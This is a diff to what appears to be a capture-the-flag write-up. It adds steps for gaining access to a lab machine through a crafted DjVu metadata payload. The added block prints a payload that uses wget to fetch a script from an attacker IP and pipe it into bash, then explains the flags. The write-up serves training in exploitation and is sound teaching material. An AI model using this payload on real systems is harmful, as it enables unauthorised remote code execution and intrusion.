@@ -393,6 +393,26 @@ bzz payload.txt payload.bzz
 
 <br />
 
-Yesss!! We're `able` to run `commands`.
+Yesss!! We're `able` to run `commands`. Now we can try to gain `access` to the `victim machine`.
 
-Now we can try to gain `access` to the `victim machine`.
+On this machine no `reverse shell` works and it does `not` have `curl` installed, so we will have to `gain` access in a rather `curious` way `using` the `wget` binary.
+
+To do so, we `repeat` all the previous `proccess` but with the only `difference` that we will be `using` the following `payload`:
+
+<br />
+
+```bash
+echo '(metadata "\c${system('wget -qO- http://10.10.14.19/index.html | bash')};")' > payload.txt
+```
+
+<br />
+
+Command Flags:
+
+-`q` -> Mute the program's output.
+
+-`O` -> Redirects the stdout.
+
+-`| bash` -> Interprets the bash code.
+
+<br />
